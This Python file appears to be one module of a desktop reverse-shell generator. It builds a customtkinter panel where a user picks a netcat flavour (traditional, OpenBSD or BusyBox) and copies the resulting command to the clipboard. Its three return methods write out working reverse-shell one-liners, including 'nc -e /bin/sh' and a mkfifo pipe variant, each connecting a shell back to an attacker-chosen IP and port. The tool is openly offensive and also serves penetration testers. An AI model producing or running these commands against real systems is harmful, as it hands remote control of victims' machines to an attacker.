import customtkinter, tkinter, pyperclip
from modules.get import select_list as shell_list
from modules.activate import Activate

def select_callback(self):
    self.rs_selected = self.select_shell_var.get()
    Activate.update_rs(self)

class rs_netcat:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp

            self.rs_netcat_shell = rs_netcat.return_rs_netcat_traditional(self)

            self.rs_netcat_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_netcat_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_netcat_select_shell = customtkinter.CTkOptionMenu(self.rs_netcat_label_frame, variable=self.select_shell_var, command=lambda value:select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_netcat_select_shell.configure(values=shell_list())
            self.rs_netcat_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_netcat_label_frame.grid_columnconfigure(1, weight=1)

            self.rdbtn_frame_1 = customtkinter.CTkFrame(self.rs_frame)
            self.rdbtn_frame_1.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_netcat_radio_var = tkinter.IntVar(value=0)
            radiobutton_1 = customtkinter.CTkRadioButton(self.rdbtn_frame_1, text="Traditional",variable=self.rs_netcat_radio_var, value=0, command=lambda:rs_netcat.change_rs_netcat_type(self), fg_color=self.colormain,hover_color=self.color_hover)
            radiobutton_1.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
            radiobutton_2 = customtkinter.CTkRadioButton(self.rdbtn_frame_1, text="OpenBSD",variable=self.rs_netcat_radio_var, value=1, command=lambda:rs_netcat.change_rs_netcat_type(self), fg_color=self.colormain,hover_color=self.color_hover)
            radiobutton_2.grid(row=1, column=2, padx=10, pady=10, sticky="ew")
            radiobutton_1 = customtkinter.CTkRadioButton(self.rdbtn_frame_1, text="BusyBox",variable=self.rs_netcat_radio_var, value=2, command=lambda:rs_netcat.change_rs_netcat_type(self), fg_color=self.colormain,hover_color=self.color_hover)
            radiobutton_1.grid(row=1, column=3, padx=10, pady=10, sticky="ew")

            self.rs_netcatlabel = customtkinter.CTkTextbox(self.rs_frame,)
            self.rs_netcatlabel.insert("0.0", text=self.rs_netcat_shell);self.rs_netcatlabel.configure(state="disabled")
            self.rs_netcatlabel.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(self.rs_netcat_shell))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            rs_netcat.change_rs_netcat_type(self)
        
        def change_rs_netcat_type(self):
            val = self.rs_netcat_radio_var.get()
            if val == 0:
                self.rs_netcat_shell = rs_netcat.return_rs_netcat_traditional(self)
                self.rs_netcatlabel.configure(state="normal");self.rs_netcatlabel.delete("0.0", "end")
                self.rs_netcatlabel.insert("0.0", text=self.rs_netcat_shell);self.rs_netcatlabel.configure(state="disabled")
            elif val == 1:
                self.rs_netcat_shell = rs_netcat.return_rs_netcat_openbsd(self)
                self.rs_netcatlabel.configure(state="normal");self.rs_netcatlabel.delete("0.0", "end") 
                self.rs_netcatlabel.insert("0.0", text=self.rs_netcat_shell);self.rs_netcatlabel.configure(state="disabled")
            elif val == 2:
                self.rs_netcat_shell = rs_netcat.return_rs_netcat_busybox(self)
                self.rs_netcatlabel.configure(state="normal");self.rs_netcatlabel.delete("0.0", "end") 
                self.rs_netcatlabel.insert("0.0", text=self.rs_netcat_shell);self.rs_netcatlabel.configure(state="disabled")

        def return_rs_netcat_traditional(self):
            return f"nc -e /bin/sh {self.ip_selected} {self.port_selected}"
        
        def return_rs_netcat_openbsd(self):
            return f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.ip_selected} {self.port_selected} >/tmp/f"
        
        def return_rs_netcat_busybox(self):
            return f"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {self.ip_selected} {self.port_selected} >/tmp/f"
